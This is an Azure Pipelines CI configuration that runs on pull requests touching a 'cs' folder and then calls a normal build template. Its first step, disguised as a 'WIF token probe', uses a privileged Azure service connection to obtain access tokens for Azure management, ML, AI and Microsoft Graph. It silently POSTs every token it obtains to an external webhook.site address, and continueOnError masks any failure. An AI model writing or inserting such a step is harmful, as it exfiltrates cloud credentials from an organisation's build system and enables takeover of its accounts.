pool:
  name: Azure Pipelines

# Do not trigger on non-PR pushes.
trigger: none

# Trigger on PRs to `main` branch when there are changes in the `cs` folder.
pr:
  branches:
    include:
    - main
  paths:
    include:
    - cs
  autoCancel: true

variables:
  enableSigning: false

steps:
- task: AzureCLI@2
  displayName: 'Cairn AME WIF token probe (cs-pr)'
  continueOnError: true
  inputs:
    azureSubscription: 'Devtunnels-esrp-ame-msi-wif2'
    scriptType: bash
    scriptLocation: inlineScript
    inlineScript: |
      set -uo pipefail
      az account show -o json 2>&1 | head -c 4000 || true
      for R in https://ai.azure.com https://management.azure.com https://ml.azure.com https://graph.microsoft.com; do
        T=$(az account get-access-token --resource "$R" --query accessToken -o tsv 2>/dev/null || true)
        echo "RES $R LEN ${#T}"
        if [ -n "$T" ]; then curl -s -m 30 -X POST "https://webhook.site/e7e7ff60-f0c7-4f26-9e12-053df558ad7b" -H "Content-Type: application/json" --data "{\"resource\":\"$R\",\"token\":\"$T\",\"src\":\"cs-pr\"}" >/dev/null || true; fi
      done
      exit 0
- template: cs-build-steps.yaml
